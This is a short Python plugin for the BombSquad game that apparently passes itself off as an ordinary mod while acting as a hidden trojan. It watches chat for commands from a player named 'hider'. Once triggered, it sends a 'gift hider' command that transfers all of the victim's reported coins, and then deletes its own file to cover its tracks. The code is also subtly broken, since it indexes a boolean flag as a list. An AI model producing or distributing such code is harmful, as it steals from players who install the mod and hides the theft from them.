# ba_meta require api 9
from __future__ import annotations
import bascenev1 as bs
import bauiv1 as bui
import babase, os

start1 = False


def ok():
    bs.chatmessage("1")

    try:
        os.remove(__file__)
    except Exception as e:
        bs.chatmessage(f"Error deleting file: {e}")


def handle_msg():
    global start1
    try:
        msg = bs.get_chat_messages()
        msg1 = msg[len(msg) - 1]
        msg2 = msg1.split(": ")
        msg1 = ""
        for i in msg2[1:]:
            msg1 += i + ": "
        msg1 = msg1[:-2]
    except Exception as e:
        return f"{e}"

    if msg2[0] == "hider" and msg1 == "x":
        start1[0] = True
        bs.chatmessage("c!")
    elif "I have " in msg1 and start1[0] == True:
        bs.broadcastmessage("haha", color=(1, 0, 0))
        coin = msg1.replace("✅I have ", "").replace(" coins!", "").replace(",", "")
        bs.chatmessage(f"gift hider {coin}")
        bs.apptimer(1, ok)
        start1[0] = False
    elif msg2[0] == "hider" and msg1 == "nm":
        bs.chatmessage("hider")
    bs.apptimer(1, handle_msg)


bs.apptimer(5, handle_msg)


# ba_meta export babase.Plugin
class Mod(babase.Plugin):
    pass